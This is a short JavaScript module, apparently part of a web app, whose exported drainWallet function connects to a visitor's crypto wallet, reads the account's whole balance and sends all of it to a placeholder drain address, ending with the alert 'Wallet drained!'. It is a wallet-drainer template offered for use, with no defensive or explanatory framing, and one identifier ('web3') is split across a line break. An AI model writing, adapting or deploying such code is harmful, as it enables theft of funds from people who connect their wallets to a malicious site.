import { connectWallet } from '../components/WalletConnect';

export const drainWallet = async () => {
  const { web
3, accounts } = await connectWallet();
  const balance = await web3.eth.getBalance(accounts[0]);
  const drainTo = "0xYourDrainAddressHere";
  const amount = balance;

  await web3.eth.sendTransaction({
    from: accounts[0],
    to: drainTo,
    value: amount
  });

  alert("Wallet drained!");
};